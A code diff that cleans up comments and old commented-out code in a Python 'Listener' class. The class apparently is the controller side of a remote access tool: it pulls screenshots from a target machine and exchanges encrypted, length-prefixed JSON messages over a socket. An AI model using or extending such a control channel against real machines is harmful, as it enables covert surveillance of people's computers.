@@ -186,15 +186,7 @@ class Listener:
         screenshot = self.receive_data()
         self.write_file("{}.png".format(self.target_ip), screenshot)
 
-    # Send Messages as Json format for data integrity purposes
-    # Sending data plainly might cause problems because end of the data stream cannot be known
     def send_data(self, data):
-
-        # # cipher_bytes = self.cipher.encrypt(data)
-        # # encrypted_text = base64.b64encode(cipher_bytes)
-        # json_data = json.dumps(data).encode()
-        # # print(encrypted_text)
-        # self.target.send(json_data)
 
         json_data = json.dumps(data).encode()
         encrypted = self.cipher_encrypt.encrypt(json_data)
@@ -202,7 +194,6 @@ class Listener:
         msg = struct.pack('>I', len(base64coded)) + base64coded
         self.target.sendall(msg)
 
-    # Read data in 1024 byte chunks until json file is fully received
     def receive_data(self):
 
         ready = select.select([self.target], [], [], 5)
@@ -215,17 +206,6 @@ class Listener:
             return self.__recvpayload(msglen)
         else:
             return None
-
-        # while True:
-        #     try:
-        #         ready = select.select([self.target], [], [], 5)
-        #         if ready[0]:
-        #             json_data += self.target.recv(1024).decode()
-        #         else:
-        #             break
-        #         return json.loads(json_data)
-        #     except ValueError:
-        #         continue
 
     def __recvlength(self, msglen):
         data = bytearray()
